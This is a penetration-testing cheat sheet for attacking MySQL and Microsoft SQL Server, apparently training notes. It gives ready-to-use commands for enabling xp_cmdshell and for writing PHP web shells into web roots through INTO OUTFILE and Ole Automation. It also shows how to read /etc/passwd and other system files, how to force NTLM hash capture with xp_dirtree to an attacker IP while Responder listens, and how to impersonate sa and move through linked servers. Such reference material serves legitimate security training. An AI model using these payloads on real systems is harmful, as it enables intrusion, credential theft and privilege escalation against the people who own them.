## Overview

- **Function:** Relational database management systems (RDBMS) like MySQL and Microsoft SQL Server (MSSQL) store structured data in tables, columns, and rows using SQL (Structured Query Language).
- **Target Value:** High-priority assets storing sensitive data (credentials, PII, financial records, business logic) and often running with high privileges, enabling lateral movement and privilege escalation.
- **Default Ports:**
    - MSSQL: TCP/1433, UDP/1434 (TCP/2433 when running in hidden mode).
    - MySQL: TCP/3306.
## Enumeration & Banner Grabbing
### 1. Nmap Scanning
Enumerate database services, versions, and NTLM/SSL details using Nmap's default scripts (`-sC`) and version detection (`-sV`).
Bash
```
nmap -Pn -sV -sC -p1433 <target_ip>
```
## Authentication Mechanisms & Connection
### 1. Authentication Types

- **Windows Authentication (Integrated Security):** Default for MSSQL; tightly integrated with Windows/Active Directory. Authenticated domain users bypass explicit SQL credential prompts.
- **Mixed Mode:** Supports both Windows/Active Directory accounts and native SQL Server database users (username/password pairs maintained inside SQL Server).
### 2. Connecting to SQL Servers
- **MySQL Client:**
    Bash
    ```
    mysql -u <username> -p<password> -h <target_ip>
    ```
- **MSSQL Client (`sqlcmd`):**
    DOS
    ```
    sqlcmd -S <target_server> -U <username> -P '<password>' -y 30 -Y 30
    ```
    _(Tip: Use `-y` and `-Y` for better output formatting)._
- **MSSQL via Linux (`sqsh`):**
    Bash
    ```
    sqsh -S <target_ip> -U <username> -P '<password>' -h
    ```
    _(Tip: Use `-h` to disable headers/footers for a cleaner layout)._
- **Impacket MSSQL Client (`mssqlclient.py`):**
    Bash
    ```
    mssqlclient.py -p 1433 <username>@<target_ip>
    ```
- **Windows Authentication Connection (`sqsh`):**
    Specify the domain or local machine prefix (e.g., `.\\accountname` or `SERVERNAME\\accountname`).
    Bash
    ```
    sqsh -S <target_ip> -U .\\<username> -P '<password>' -h
    ```
## Default System Databases

- **MySQL:** `mysql` (system tables/credentials), `information_schema` (metadata), `performance_schema` (monitoring), `sys` (DBA helper objects).
- **MSSQL:** `master` (instance configuration & logins), `msdb` (SQL Server Agent tasks), `model` (template DB), `resource` (read-only system objects), `tempdb` (temporary objects).
## Core SQL Syntax Quick Reference

|**Action**|**MySQL Syntax**|**MSSQL Syntax**|
|---|---|---|
|**Show Databases**|`SHOW DATABASES;`|`SELECT name FROM master.dbo.sysdatabases` _(requires `GO`)_|
|**Select Database**|`USE <db_name>;`|`USE <db_name>` _(requires `GO`)_|
|**Show Tables**|`SHOW TABLES;`|`SELECT table_name FROM <db>.INFORMATION_SCHEMA.TABLES`|
|**Select Table Data**|`SELECT * FROM <table_name>;`|`SELECT * FROM <table_name>`|

## Advanced Exploitation & Post-Exploitation
### 1. Command Execution

- **MSSQL (`xp_cmdshell`):** Executes system commands via SQL. Disabled by default.
    - _Enable xp_cmdshell:_
        DOS
        ```
        EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
        EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
        ```
    - _Execute Command:_
        DOS
        ```
        xp_cmdshell 'whoami'
        GO
        ```
- **MySQL (User Defined Functions - UDF):** Allows executing custom C/C++ compiled code/functions if appropriate privileges exist.
### 2. Writing Local Files
- **MySQL (Into Web Root):** Write web shells if `secure_file_priv` is empty and permissions permit.
    SQL
    ```
    SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
    ```
- **MSSQL (Ole Automation Procedures):** Requires admin privileges to enable and write files.
    - _Enable Automation:_
        DOS
        ```
        sp_configure 'show advanced options', 1; RECONFIGURE;
        sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
        ```
    - _Create File:_
        DOS
        ```
        DECLARE @OLE INT, @FileID INT;
        EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
        EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1;
        EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>';
        EXECUTE sp_OADestroy @FileID; EXECUTE sp_OADestroy @OLE;
        GO
        ```
### 3. Reading Local Files
- **MSSQL (`OPENROWSET`):** Read arbitrary files accessible by the service account.
    DOS
    ```
    SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
    GO
    ```
- **MySQL (`LOAD_FILE`):** Read files if secure file privileges permit.
    SQL
    ```
    SELECT LOAD_FILE("/etc/passwd");
    ```
### 4. Capturing MSSQL Service Hashes (Responder / Impacket)

Force the database server to authenticate to an attacker-controlled SMB server using undocumented stored procedures, capturing the NTLMv2 hash of the SQL service account.
- **Responder Listener:**
    Bash
    ```
    sudo responder -I <interface>
    ```
- **Impacket SMB Server:**
    Bash
    ```
    sudo impacket-smbserver share ./ -smb2support
    ```
- **Triggering Hash via SQL Query:**
    DOS
    ```
    EXEC master..xp_dirtree '\\<attacker_ip>\share\'
    GO
    -- Alternative:
    EXEC master..xp_subdirs '\\<attacker_ip>\share\'
    GO
    ```
### 5. Impersonating Users (MSSQL)
Abusing the `IMPERSONATE` permission to assume another user's context (e.g., escalating to `sa`)
- **Identify Impersonatable Users:**
    DOS
    ```
    SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
    GO
    ```
- **Execute as Target Login:**
    DOS
    ```
    USE master;
    EXECUTE AS LOGIN = 'sa';
    SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
    GO
    ```
    _(Use `REVERT;` to return to the original user context)._
### 6. Lateral Movement via Linked Servers (MSSQL)
Query or execute code on linked remote database instances.
- **Identify Linked Servers:**
    DOS
    ```
    SELECT srvname, isremote FROM sysservers;
    GO
    ```
- **Execute Pass-Through Query on Linked Server:**
    DOS
    ```
    EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<linked_server_name>]
    GO
    ```